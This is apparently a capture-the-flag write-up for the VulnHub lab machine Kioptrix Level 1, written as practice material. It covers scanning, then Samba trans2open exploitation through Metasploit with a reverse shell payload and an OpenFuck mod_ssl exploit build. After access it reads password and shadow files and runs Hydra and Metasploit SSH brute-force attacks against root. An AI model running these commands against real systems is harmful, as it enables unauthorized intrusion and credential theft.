# Kioptrix Level 1

<p align="left">
  <img src="./assets/kioptrix-1/00-card.png" alt="Kioptrix Level 1 machine card" width="650">
</p>

Vulnhub Kioptrix Level 1 Gain Root

## 1. Nmap

Command:
```bash
sudo nmap -T4 -p- -A (target)
```


### Results:

Ports:

- 80/443: HTTP/HTTPS Protocol (check the website at the IP address).
	- Default Apache page with PHP.
	- Information revealed on the 404 page: Apache 1.3.20, Kioptrix server.

## 2. Nikto

Command:
```bash
nikto -h http://(target)
```

### Results:

- Found an outdated version of Apache:
	- Apache 1.3.20 / 2.2.34.

## 3. DirBuster

Settings:
- Target URL: `http://(ip):80/`
- Options: "Go faster"
- Wordlist: /usr/share/wordlists/dirbuster/small.

[http://192.168.149.131/usage/usage_200909.html](http://192.168.149.131/usage/usage_200909.html) - Webalizer Version 2.01

## 4. Burp Suite

Settings:
- Browser Proxy: 127.0.0.1.

#### Actions When Inspecting the Website:

- Review the page source code.
	- Look for passwords or usernames in the code.
- Analyze the server headers to identify the software version.

## 5. SMB2

- Metasploit:

```bash
msfconsole > search smb
use (number) > info
set RHOSTS (ip)
run
```

- Check SMB version.

```bash
smbclient -L \\(ip)\\
```

## 6. SSH

- OpenSSH 2.9p2 (protocol 1.99)

## Researching Vulnerabilities:

Port analysis priorities:

- 80 > 443 > 139 > 445

Potential vulnerabilities:

- Apache mod_ssl/2.8.4: Search for exploits on Google.
- Ports 80/443: Potential OpenLuck vulnerability.
	- [https://www.exploit-db.com/exploits/47080](https://www.exploit-db.com/exploits/47080)
	- [https://github.com/heltonWernik/OpenLuck](https://github.com/heltonWernik/OpenLuck)

- Apache (version): Look for exploits.
- SMB (Unix Samba 2.2.1a):
	- Google: Rapid7 Exploit.
	- [https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/](https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/)
	- [https://www.exploit-db.com/exploits/7](https://www.exploit-db.com/exploits/7)
- Terminal (offline):

```bash
searchsploit Samba 2.2.x
```

- SSH (OpenSSH 2.9p2):
```BASh
searchsploit OpenSSH 2.9p2
```

## 7. Nessus

- Basic Network Scan

## 8. Exploitation

Search for exploits:

```baSH
searchsploit Samba 2.2
```

Metasploit:

```bash
msfconsole
search trans2open
use 1 (linux/samba/trans2open)
```

```BASH
options
set RHOSTS (target ip)
show targets
```

```bash
set payload Linux/x86/shell_reverse_tcp
options
```

```bash
run
whoami
hostname
```

## 9. Manual Exploitation

- [https://github.com/heltonWernik/OpenLuck](https://github.com/heltonWernik/OpenLuck)
	- Follow the instruction

```bash
git clone https://github.com/heltonWernik/OpenFuck.git
cd OpenFuck
apt-get install libssl-dev
gcc -o OpenFuck OpenFuck.c -lcrypto
ls
```

./open

- Check the usage and take the OffSet:

- I'm gonna run 0x6b offset:

```bash
./open 0x6b (target ip) -c 40
```

- Let's check the users:

```bash
sudo -l
cat /etc/passwd
```

- Check the hashes:
```bash
cat /etc/shadows
```

## 10. Brute Force Attack

> [!NOTE]
> Test password strenght / check of we can get in with a weak password or default password. Check of the Blue Team get alert

Hydra attack:

```bash
hydra -l root -P /usr/share/wordlists/Metasploit/unix.passwords.txt ssh://(target IP):22 -t 4 -V
```

Metasploit SSH brute-force attack:

```bash
msfconsole
search ssh
```

Let's take auxiliary module for SSH login:

```bash
use auxiliary/scanner/ssh/ssh_login
options
set username root
set pass_file /usr/share/wordlists/Metasploit/unix_passwords.txt
set rhosts (ip)
set verbose true
run
```
## Download

[https://www.vulnhub.com/entry/kioptrix-level-1-1,22/](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

[NextPage 1](https://debas.gitbook.io/pentesting/page-1)

Last updated 1 day ago

Target URL: http://(ip):80/

Options: "Go faster"
---

**Live version:** [read this write-up on my blog](https://debasjan.github.io/writeups/kioptrix-1/)
